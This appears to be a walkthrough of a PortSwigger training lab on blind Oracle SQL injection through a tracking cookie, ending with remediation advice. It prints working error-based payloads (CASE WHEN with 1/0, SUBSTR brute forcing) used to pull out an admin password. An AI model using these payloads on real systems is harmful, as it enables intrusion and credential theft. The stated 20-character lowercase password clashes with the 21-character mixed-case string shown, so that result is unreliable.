# PortSwigger Web Security Academy: Blind SQL Injection with Conditional Errors

This repository contains my detailed writeup and proof-of-concept for solving the PortSwigger lab: **"Blind SQL injection with conditional errors"**. 

##  Lab Description
The application uses a tracking cookie (`TrackingId`) for analytics and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned, and the page doesn't change based on whether the query is true or false. However, if the SQL query causes a database error, the server responds with an **HTTP 500 Internal Server Error**. 

Our goal is to exploit this vulnerability, exfiltrate the administrator password, and log in.

---

## 🛠️ Step-by-Step Walkthrough (How I Solved It)

### Step 1: Confirming SQL Injection & Identifying the Database
First, I intercepted the request using **Burp Suite Proxy** and modified the `TrackingId` cookie to test how the server responds to structural database errors.

1. I injected a single quote `'` into the cookie:  
   `TrackingId=xyz'`  
    **Result:** The server returned an **HTTP 500 Internal Server Error**, confirming a syntax error.
   
2. I injected two single quotes `''` to close the syntax correctly:  
   `TrackingId=xyz''`  
    **Result:** The server returned an **HTTP 200 OK**, confirming SQL injection vulnerability.

3. To identify the database type, I tested Oracle-specific syntax using the `dual` table:  
   `TrackingId=xyz' || (SELECT '' FROM dual) || '`  
    **Result:** **HTTP 200 OK**, which proved the backend database is **Oracle**.

---

### Step 2: Confirming the 'users' Table and 'administrator' User
Next, I needed to check if the `users` table exists and if the `administrator` user is present. I used a conditional statement (`CASE WHEN`) combined with a divide-by-zero error (`1/0`) to force an HTTP 500 error only if the condition was True.

1. Verifying the `users` table:  
   `TrackingId=xyz' || (SELECT '' FROM users WHERE ROWNUM = 1) || '`  
    **Result:** **HTTP 200 OK** (The table exists).

2. Verifying the `administrator` username:  
   `TrackingId=xyz' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '`  
    **Result:** **HTTP 500 Internal Server Error** (The condition `1=1` triggered `1/0`, confirming the user `administrator` exists).

---

### Step 3: Finding the Password Length
I needed to determine how many characters long the administrator's password was. I checked if the length was greater than a specific number using this payload:

`TrackingId=xyz' || (SELECT CASE WHEN LENGTH(password)>$1$ THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '`

* I sent the request to **Burp Intruder** and iterated the number from 1 onwards.
* The server kept returning **HTTP 500** until I hit the number **20**. 
* When tested for `LENGTH(password)>20`, it returned **HTTP 200 OK**.
* **Conclusion:** The password length is exactly **20 characters**.

---

### Step 4: Extracting the Password (Brute-Forcing)
To extract the password character by character, I used the `SUBSTR()` function to check each character position against an alphanumeric list (`a-z`, `0-9`).

**Payload Used:**  
`TrackingId=xyz' || (SELECT CASE WHEN SUBSTR(password, §1§, 1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '`

I configured **Burp Intruder** with **Cluster Bomb** attack type:
* **Payload 1 (Position):** Numbers from `1` to `20`.
* **Payload 2 (Character):** `a-z` and `0-9`.

Whenever a character matched correctly, the database triggered a divide-by-zero error, sending back an **HTTP 500 Internal Server Error**.

####  Successfully Exfiltrated Password:
By filtering the Intruder results for HTTP 500 status codes, I reconstructed the password character by character:
`Vyg09u2w535842apqghxj`

---

### Step 5: Logging In & Completing the Lab
1. Navigated to the `/login` page of the lab.
2. Entered `administrator` as the username.
3. Entered the extracted password: `Vyg09u2w535842apqghxj`

 **Result:** Successfully logged in as admin and the lab status changed to **Solved**!

---

##  Remediation (How to Fix It)
To protect applications against Blind SQL Injection vulnerabilities, the following security practices should be implemented:
1. **Use Parameterized Queries (Prepared Statements):** Never concatenate user inputs or cookies directly into SQL commands.
2. **Input Validation:** Implement strict whitelisting for cookies and input parameters.
3. **Generic Error Handling:** Disable verbose or database-specific error messages. The server should return a generic error page for all internal failures so attackers cannot use error codes (`500` vs `200`) to extract data.
